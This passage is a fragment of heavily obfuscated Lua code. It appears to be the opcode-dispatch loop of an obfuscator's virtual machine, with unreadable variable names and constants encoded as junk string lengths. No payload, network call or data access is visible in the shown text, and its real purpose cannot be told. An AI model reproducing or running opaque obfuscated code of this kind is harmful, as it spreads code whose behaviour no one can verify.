ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sl")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("xxs")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("oB")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("V55")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("IgFh")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Lc")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("03K")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("XbMf")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("2C")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("MxJ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("oAMn")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Di")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("rGG")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("jNpk")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("1d")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("b3S")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("r6")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("ZVI")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("26")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("AfN")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("2Klx")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("eg")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("EdH")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("UK")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("5Ve")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("hX")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("0O0")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("pW")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("3Gl")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("04")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("cbb")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sYHs")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Dm")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#{{27;627;243;365};"1 + 1 = 111";{330;743;211;874};}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("2b")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("OtT")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("g8Is")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Zg")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("xty")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Qq")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("pdc")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("dA")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("02K")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("cbOl")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("5A")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("CZx")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Varz")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("xj")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("d3f")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("P1")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("KWK")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{{635;105;539;1};{355;945;627;235};"1 + 1 = 111";"1 + 1 = 111";}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("vV")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("eMP")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("84h6")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("Fn")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("gdc")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("aa")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("cet")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("9FtR")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ZY")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("pfJ")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("q2sA")]];elseif ajefa_IIIlIllIllllIIllIlllIIll==#("1fddxh2bi3AnqP94p6gzJeRHd")then ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Sa")]]=(ajefa_lllIIlIllIlIllllIIlIIlll[#("DN6")]~=0);else local ajefa_lIIllIlIIlllII=ajefa_lllIIlIllIlIllllIIlIIlll[#("BFK")];local ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lIlllIll[ajefa_lIIllIlIIlllII]for ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("i8eZ")]do ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll..ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll];end;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("5p")]]=ajefa_IlIIIlIllIlIlllIlIlIllll;end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("6JlbtzYOKokUZN4ht2TWErhyorvh7")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("zHacls0gKazNfVUFhDFCUYYq0PB")then local ajefa_IIIlIllIllllIIllIlllIIll;ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#{{623;790;239;333};{224;886;2;712};}]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1])ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Ke")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("tu")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ozA")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("2rXt")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("DD")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("T9P")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("qY")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1])ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("RG")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("ylB")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Tt")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("Z8E")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("VP")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1])ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("In")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("F0g")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("nm")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("up1")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("gp5n")]];elseif ajefa_IIIlIllIllllIIllIlllIIll>#("XcdRRW0OUWCLrnsSx1mxNTj3MGdK")then local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lllIIlIllIlIllllIIlIIlll[#("sC")]local ajefa_lIIllIlIIlllII,ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_llIIllIIIIlI(ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll](ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll+1]))ajefa_lIIIIIlIllIlllllllIIll=ajefa_IlIIIlIllIlIlllIlIlIllll+ajefa_lllIIlIllIlIllllIIlIIlll-1 local ajefa_IlIIIlIllIlIlllIlIlIllll=0;for ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lllIIlIllIlIllllIIlIIlll,ajefa_lIIIIIlIllIlllllllIIll do ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll]=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];end;else local ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("t3")];local ajefa_lIIllIlIIlllII=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ZA7")]];ajefa_lIlllIll[ajefa_IlIIIlIllIlIlllIlIlIllll+1]=ajefa_lIIllIlIIlllII;ajefa_lIlllIll[ajefa_IlIIIlIllIlIlllIlIlIllll]=ajefa_lIIllIlIIlllII[ajefa_lllIIlIllIlIllllIIlIIlll[#("B1qW")]];end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("TmH2ctI7S5s5gVua4jGGf39Cekd2ke")then local ajefa_lIIllIlIIlllII=ajefa_lllIIlIllIlIllllIIlIIlll[#("jW")];local ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lIlllIll[ajefa_lIIllIlIIlllII+2];local ajefa_IlIIllIIIl=ajefa_lIlllIll[ajefa_lIIllIlIIlllII]+ajefa_IIIlIllIllllIIllIlllIIll;ajefa_lIlllIll[ajefa_lIIllIlIIlllII]=ajefa_IlIIllIIIl;if(ajefa_IIIlIllIllllIIllIlllIIll>0)then if(ajefa_IlIIllIIIl<=ajefa_lIlllIll[ajefa_lIIllIlIIlllII+1])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("bMM")];ajefa_lIlllIll[ajefa_lIIllIlIIlllII+3]=ajefa_IlIIllIIIl;end elseif(ajefa_IlIIllIIIl>=ajefa_lIlllIll[ajefa_lIIllIlIIlllII+1])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("Orx")];ajefa_lIlllIll[ajefa_lIIllIlIIlllII+3]=ajefa_IlIIllIIIl;end elseif ajefa_IIIlIllIllllIIllIlllIIll>#("Sq4aK5To3UUP53CH7Z2SvHdNZneX1pQ")then if(ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("rk")]]~=ajefa_lllIIlIllIlIllllIIlIIlll[#("i3SM")])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("PTX")];end;else local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lllIIlIllIlIllllIIlIIlll[#("aI")]ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll](ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll+1])end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("NUKPlVVfl5NWundJMNgcsxZlmrkx15yNe7cksX")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("meWHB4rsLjFknjNEp4zC4KyopH9Rxl3pZr4")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("G0zq58KmvUjECEWp3uCMQIq34K5Aqpv6o")then ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("zI")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("A4C")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("qRLK")]];elseif ajefa_IIIlIllIllllIIllIlllIIll==#("8AGhH5al3GyFp3ANvF0rs8JFxudj6fznpX")then local ajefa_IIIlIllIllllIIllIlllIIll;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{319;31;154;27};}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("mju")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("s3i2")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Qm")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("bmI")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("eMrA")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ga")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("DCA")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("RhY6")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("cb")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("IDV")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("UJgy")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Vg")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("bfN")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("zLHJ")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("6k")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("J3i")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{933;871;555;746};{604;279;869;640};}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("L0S")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("oqCD")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("JI")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("d0H")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("JB")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("XJU")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("aU")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("fGJ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("lRnH")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Sj")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("eme")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("ngcq")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("LZ")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("1yf")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("YJ0h")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("5N")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("7Dp")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("afVh")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("9n")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("rRS")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("RKmk")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("zg")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("bW0")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlII